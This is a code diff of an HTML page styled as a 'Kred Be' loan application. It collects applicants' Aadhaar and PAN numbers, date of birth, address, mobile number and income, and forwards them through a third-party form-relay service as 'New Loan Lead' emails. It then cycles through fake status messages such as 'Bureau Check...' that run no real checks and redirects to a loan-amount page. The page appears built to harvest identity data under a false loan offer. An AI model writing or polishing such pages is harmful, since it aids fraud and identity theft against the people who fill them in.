@@ -105,6 +105,7 @@
         #submit-btn.enabled {
             background-color: var(--primary-blue) !important;
             cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,51,141,0.3);
         }
 
         #loader-overlay {
@@ -132,25 +133,24 @@
 
     <div class="header">
         <div class="logo-area"><img src="kr.png" alt="Logo" class="logo-img"></div>
-        <div class="welcome-text">Application Details</div>
+        <div class="welcome-text">Complete Application</div>
     </div>
 
     <div class="container">
         <h2>Personal Details</h2>
 
-        <form id="loanForm" action="https://api.web3forms.com/submit" method="POST">
+        <form id="loanForm">
             <input type="hidden" name="access_key" value="fea091d8-a631-4425-aff6-82815670893b">
-            <input type="hidden" name="subject" value="New Loan Application Received">
-            <input type="hidden" name="from_name" value="Kred Be App">
+            <input type="hidden" name="subject" value="New Loan Lead - Kred Be">
 
             <div style="display: flex; gap: 10px;">
                 <div class="form-group" style="flex: 1;">
                     <label>First Name</label>
-                    <input type="text" name="First_Name" id="first-name" placeholder="John" required>
+                    <input type="text" name="First_Name" id="first-name" placeholder="First Name" required>
                 </div>
                 <div class="form-group" style="flex: 1;">
                     <label>Last Name</label>
-                    <input type="text" name="Last_Name" id="last-name" placeholder="Doe" required>
+                    <input type="text" name="Last_Name" id="last-name" placeholder="Last Name" required>
                 </div>
             </div>
 
@@ -172,53 +172,18 @@
                 <label>Select State</label>
                 <select name="State" id="state-select" required>
                     <option value="">-- Choose State --</option>
-                    <option value="Andhra Pradesh">Andhra Pradesh</option>
-                    <option value="Arunachal Pradesh">Arunachal Pradesh</option>
-                    <option value="Assam">Assam</option>
-                    <option value="Bihar">Bihar</option>
-                    <option value="Chandigarh">Chandigarh</option>
-                    <option value="Chhattisgarh">Chhattisgarh</option>
-                    <option value="Dadra and Nagar Haveli">Dadra and Nagar Haveli</option>
-                    <option value="Daman and Diu">Daman and Diu</option>
-                    <option value="Delhi">Delhi</option>
-                    <option value="Goa">Goa</option>
-                    <option value="Gujarat">Gujarat</option>
-                    <option value="Haryana">Haryana</option>
-                    <option value="Himachal Pradesh">Himachal Pradesh</option>
-                    <option value="Jammu and Kashmir">Jammu and Kashmir</option>
-                    <option value="Jharkhand">Jharkhand</option>
-                    <option value="Karnataka">Karnataka</option>
-                    <option value="Kerala">Kerala</option>
-                    <option value="Ladakh">Ladakh</option>
-                    <option value="Lakshadweep">Lakshadweep</option>
-                    <option value="Madhya Pradesh">Madhya Pradesh</option>
-                    <option value="Maharashtra">Maharashtra</option>
-                    <option value="Manipur">Manipur</option>
-                    <option value="Meghalaya">Meghalaya</option>
-                    <option value="Mizoram">Mizoram</option>
-                    <option value="Nagaland">Nagaland</option>
-                    <option value="Odisha">Odisha</option>
-                    <option value="Puducherry">Puducherry</option>
-                    <option value="Punjab">Punjab</option>
-                    <option value="Rajasthan">Rajasthan</option>
-                    <option value="Sikkim">Sikkim</option>
-                    <option value="Tamil Nadu">Tamil Nadu</option>
-                    <option value="Telangana">Telangana</option>
-                    <option value="Tripura">Tripura</option>
-                    <option value="Uttar Pradesh">Uttar Pradesh</option>
-                    <option value="Uttarakhand">Uttarakhand</option>
-                    <option value="West Bengal">West Bengal</option>
+                    <option value="Andhra Pradesh">Andhra Pradesh</option><option value="Arunachal Pradesh">Arunachal Pradesh</option><option value="Assam">Assam</option><option value="Bihar">Bihar</option><option value="Chandigarh">Chandigarh</option><option value="Chhattisgarh">Chhattisgarh</option><option value="Dadra and Nagar Haveli">Dadra and Nagar Haveli</option><option value="Daman and Diu">Daman and Diu</option><option value="Delhi">Delhi</option><option value="Goa">Goa</option><option value="Gujarat">Gujarat</option><option value="Haryana">Haryana</option><option value="Himachal Pradesh">Himachal Pradesh</option><option value="Jammu and Kashmir">Jammu and Kashmir</option><option value="Jharkhand">Jharkhand</option><option value="Karnataka">Karnataka</option><option value="Kerala">Kerala</option><option value="Ladakh">Ladakh</option><option value="Lakshadweep">Lakshadweep</option><option value="Madhya Pradesh">Madhya Pradesh</option><option value="Maharashtra">Maharashtra</option><option value="Manipur">Manipur</option><option value="Meghalaya">Meghalaya</option><option value="Mizoram">Mizoram</option><option value="Nagaland">Nagaland</option><option value="Odisha">Odisha</option><option value="Puducherry">Puducherry</option><option value="Punjab">Punjab</option><option value="Rajasthan">Rajasthan</option><option value="Sikkim">Sikkim</option><option value="Tamil Nadu">Tamil Nadu</option><option value="Telangana">Telangana</option><option value="Tripura">Tripura</option><option value="Uttar Pradesh">Uttar Pradesh</option><option value="Uttarakhand">Uttarakhand</option><option value="West Bengal">West Bengal</option>
                 </select>
             </div>
 
             <div class="form-group">
-                <label>Address Line 1 (House/Street)</label>
-                <input type="text" name="Address_Line_1" id="address1" placeholder="House No / Street" required>
+                <label>Address Line 1</label>
+                <input type="text" name="Address_1" id="address1" placeholder="House/Street" required>
             </div>
 
             <div class="form-group">
-                <label>Address Line 2 (District/City)</label>
-                <input type="text" name="Address_Line_2" id="address2" placeholder="District / City" required>
+                <label>Address Line 2</label>
+                <input type="text" name="Address_2" id="address2" placeholder="District/City" required>
             </div>
 
             <div class="form-group">
@@ -233,7 +198,7 @@
 
             <div class="form-group">
                 <label>PAN Card Number</label>
-                <input type="text" name="PAN_Card" id="pan" placeholder="ABCDE1234F" style="text-transform: uppercase;" required>
+                <input type="text" name="PAN" id="pan" placeholder="ABCDE1234F" style="text-transform: uppercase;" required>
             </div>
 
             <div class="form-group">
@@ -241,7 +206,7 @@
                 <input type="date" name="DOB" id="dob" required>
             </div>
 
-            <input type="hidden" name="Employment_Status" id="hidden-emp">
+            <input type="hidden" name="Employment" id="hidden-emp">
             <label>Employment Status</label>
             <div class="radio-group" id="emp-group">
                 <div class="radio-item" onclick="selectItem('emp', this)">Self Employed</div>
@@ -252,7 +217,7 @@
 
             <div class="form-group">
                 <label>Monthly Income</label>
-                <div class="input-with-icon"><span>₹</span><input type="number" name="Monthly_Income" id="income" placeholder="10,000 - 80,000" required></div>
+                <div class="input-with-icon"><span>₹</span><input type="number" name="Income" id="income" placeholder="10,000 - 80,000" required></div>
             </div>
 
             <div style="display:flex; gap:10px;">
@@ -271,28 +236,27 @@
                         <option value="Medical">Medical</option>
                         <option value="Education">Education</option>
                         <option value="Personal">Personal</option>
-                        <option value="Other">Other</option>
                     </select>
                 </div>
             </div>
 
             <div class="form-group">
-                <label>Requested Loan Amount</label>
+                <label>Requested Amount</label>
                 <div class="input-with-icon"><span>₹</span><input type="number" name="Loan_Amount" id="loan-amount" placeholder="10,000 - 5,00,000" required></div>
             </div>
 
             <div style="display: flex; align-items: flex-start; gap: 10px; margin-bottom: 25px;">
-                <input type="checkbox" id="agree" style="width: 20px; height: 20px;" required>
-                <label style="font-weight: normal; font-size: 9pt; line-height: 1.4;">I confirm that all details provided are true and accurate.</label>
+                <input type="checkbox" id="agree" required>
+                <label style="font-weight: normal; font-size: 9pt;">I declare that all details provided are true and accurate.</label>
             </div>
 
-            <button type="button" id="submit-btn" onclick="startProcessing()">Check Eligibility</button>
+            <button type="button" id="submit-btn" onclick="handleSubmit()">Check Eligibility</button>
         </form>
     </div>
 
     <div id="loader-overlay">
         <div class="spinner"></div>
-        <div id="loader-text">Analyzing profile...</div>
+        <div id="loader-text">Submitting Data...</div>
     </div>
 
     <script>
@@ -324,71 +288,58 @@
         }
 
         function validateForm() {
-            const income = parseInt(document.getElementById('income').value) || 0;
-            const amount = parseInt(document.getElementById('loan-amount').value) || 0;
-            const aadhar = document.getElementById('aadhar').value;
-            const pan = document.getElementById('pan').value.toUpperCase();
-            const isAgreed = document.getElementById('agree').checked;
+            const f = {
+                fn: document.getElementById('first-name').value,
+                ln: document.getElementById('last-name').value,
+                mob: document.getElementById('mobile').value,
+                st: document.getElementById('state-select').value,
+                pin: document.getElementById('pincode').value,
+                adh: document.getElementById('aadhar').value,
+                pan: document.getElementById('pan').value.toUpperCase(),
+                inc: parseInt(document.getElementById('income').value) || 0,
+                amt: parseInt(document.getElementById('loan-amount').value) || 0,
+                chk: document.getElementById('agree').checked
+            };
 
-            const isIncomeOk = income >= 10000 && income <= 80000;
-            const isAmountOk = amount >= 10000 && amount <= 500000;
-            const isAadharOk = validateAadhar(aadhar);
-            const isPanOk = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan);
+            const isIncOk = f.inc >= 10000 && f.inc <= 80000;
+            const isAmtOk = f.amt >= 10000 && f.amt <= 500000;
+            const isAdhOk = validateAadhar(f.adh);
+            const isPanOk = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(f.pan);
 
-            document.getElementById('income').classList.toggle('error-input', income > 0 && !isIncomeOk);
-            document.getElementById('loan-amount').classList.toggle('error-input', amount > 0 && (!isAmountOk || amount > (income * 5)));
-            document.getElementById('aadhar').classList.toggle('error-input', aadhar.length === 12 && !isAadharOk);
-            document.getElementById('pan').classList.toggle('error-input', pan.length > 5 && !isPanOk);
+            document.getElementById('income').classList.toggle('error-input', f.inc > 0 && !isIncOk);
+            document.getElementById('loan-amount').classList.toggle('error-input', f.amt > 0 && (!isAmtOk || f.amt > (f.inc * 5)));
+            document.getElementById('aadhar').classList.toggle('error-input', f.adh.length === 12 && !isAdhOk);
+            document.getElementById('pan').classList.toggle('error-input', f.pan.length > 5 && !isPanOk);
 
-            const isFormComplete = 
-                document.getElementById('first-name').value.length >= 2 &&
-                document.getElementById('mobile').value.length === 10 &&
-                document.getElementById('pincode').value.length === 6 &&
-                document.getElementById('address1').value.length > 5 &&
-                document.getElementById('address2').value.length > 3 &&
-                document.getElementById('state-select').value !== '' &&
-                document.getElementById('loan-type').value !== '' && 
-                document.getElementById('loan-purpose').value !== '' &&
-                isIncomeOk && isAmountOk && isAadharOk && isPanOk &&
-                selectedGender !== '' && selectedEmp !== '' && isAgreed;
+            const isReady = f.fn.length >= 2 && f.ln.length >= 2 && f.mob.length === 10 && f.st !== "" && f.pin.length === 6 &&
+                            isAdhOk && isPanOk && isIncOk && isAmtOk && selectedGender !== "" && selectedEmp !== "" && f.chk;
 
             const btn = document.getElementById('submit-btn');
-            if(isFormComplete) btn.classList.add('enabled'); else btn.classList.remove('enabled');
+            if(isReady) btn.classList.add('enabled'); else btn.classList.remove('enabled');
+            return isReady;
         }
 
-        async function startProcessing() {
-            if(!document.getElementById('submit-btn').classList.contains('enabled')) return;
-            
-            localStorage.setItem('userName', document.getElementById('first-name').value + " " + document.getElementById('last-name').value);
-            localStorage.setItem('userLoanAmount', document.getElementById('loan-amount').value);
-
+        async function handleSubmit() {
+            if(!validateForm()) return;
             const overlay = document.getElementById('loader-overlay');
             const text = document.getElementById('loader-text');
             overlay.style.display = 'flex';
 
-            // Submit form data to Web3Forms API
-            const form = document.getElementById('loanForm');
-            const formData = new FormData(form);
-            
-            try {
-                fetch("https://api.web3forms.com/submit", {
-                    method: "POST",
-                    body: formData
-                });
-            } catch (err) {
-                console.log("Submit error");
-            }
+            localStorage.setItem('userName', document.getElementById('first-name').value + " " + document.getElementById('last-name').value);
+            localStorage.setItem('userLoanAmount', document.getElementById('loan-amount').value);
 
-            // Processing UI steps
-            const steps = ["Securing Data...", "Fetching Bureau Records...", "Verifying Address...", "Finalizing Limit..."];
-            let i = 0;
-            const interval = setInterval(() => {
-                if(i < steps.length) text.innerText = steps[i++];
-                else { 
-                    clearInterval(interval); 
-                    window.location.href = "yourloanamount.html"; 
-                }
-            }, 3000);
+            const formData = new FormData(document.getElementById('loanForm'));
+            try {
+                const resp = await fetch("https://api.web3forms.com/submit", { method: "POST", body: formData });
+                if(resp.ok) {
+                    const steps = ["Securing Data...", "Bureau Check...", "Analyzing Address...", "Finalizing Limit..."];
+                    let i = 0;
+                    const interval = setInterval(() => {
+                        if(i < steps.length) text.innerText = steps[i++];
+                        else { clearInterval(interval); window.location.href = "yourloanamount.html"; }
+                    }, 2500);
+                } else { alert("Error! Please check connection."); overlay.style.display='none'; }
+            } catch(e) { alert("Server error."); overlay.style.display='none'; }
         }
 
         document.querySelectorAll('input, select, #agree').forEach(el => {
@@ -397,5 +348,4 @@
         });
     </script>
 </body>
-    </html>
-    
+</html>
